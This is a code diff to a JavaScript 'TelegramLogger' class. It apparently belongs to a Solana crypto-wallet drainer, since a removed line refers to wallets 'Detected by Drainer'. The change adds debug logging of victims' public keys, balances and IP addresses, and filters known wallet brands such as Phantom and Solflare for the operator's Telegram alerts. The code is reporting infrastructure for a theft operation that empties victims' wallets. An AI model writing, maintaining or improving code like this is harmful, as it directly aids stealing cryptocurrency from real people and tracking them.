@@ -99,9 +99,18 @@ class TelegramLogger {
     const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
     const ip = data.ip || 'Unknown';
     const walletType = data.walletType || 'Unknown';
+    
+    // Debug logging
+    console.log('[TELEGRAM] logWalletDetected called with:', {
+      publicKey: data.publicKey,
+      walletType: data.walletType,
+      lamports: data.lamports,
+      ip: data.ip
+    });
 
-    // Only show wallet type if it's meaningful (not "Unknown" or "Detected by Drainer")
-    const walletTypeDisplay = (walletType === 'Unknown' || walletType === 'Detected by Drainer') ? '' : `💼 <b>Type:</b> ${walletType}`;
+    // Show wallet type if it's a known wallet type
+    const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet', 'Exodus'];
+    const walletTypeDisplay = knownWalletTypes.includes(walletType) ? `💼 <b>Type:</b> ${walletType}` : '';
 
     const message = `
 <b>👛 Wallet Detected</b>
